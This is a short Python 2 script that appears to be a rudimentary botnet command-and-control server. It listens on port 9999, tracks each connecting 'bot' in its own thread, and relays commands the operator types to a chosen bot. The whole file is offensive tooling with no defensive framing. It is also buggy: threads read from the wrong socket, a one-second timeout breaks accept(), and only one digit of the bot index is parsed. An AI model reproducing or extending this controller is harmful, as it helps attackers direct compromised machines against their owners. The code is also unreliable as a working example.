#!/usr/bin/env python

import socket, threading
import string
import sys 
import select 
import tty 
import termios


class Bot(threading.Thread):

    def __init__(self,ip,port,socket,idn):          #bot class
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.socket = socket
        self.idn= idn
        print "[+] New thread started for "+ip+":"+str(port)


    def run(self):                  # SERVER SIDE RECEIVE               
                                    # these threads will be running parallely
                                    #so server can use whatever any bot sends to it

        data= "dummy"
        while len(data):                            
            data = clientsock.recv(2048)
         #   print "Client sent : "+data           
          
        print "Client disconnected..."

host = "0.0.0.0"
port = 9999
num_bots=0
Bot_array = []
tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

tcpsock.bind((host,port))
threads = []


while True:
    tcpsock.listen(4)
    tcpsock.settimeout(1)

    print "\nListening for incoming connections..."
    (clientsock, (ip, port)) = tcpsock.accept()
    
    newthread =  (Bot)(ip, port,clientsock, num_bots)  # new thread for each socket
    Bot_array.append(newthread)                                 #each bot in an array
    num_bots+=1
    newthread.start()
    threads.append(newthread)
    command= raw_input("Enter command in format <botnumber> <command>:") 
    if(command[0].isdigit() and int(command[0])<num_bots ):     # if there isnt a number in the beginning it won't send to any socket
        Bot_array[int(command[0])].socket.send(command)         #send command to whichever bot you specify
for t in threads:
    t.join()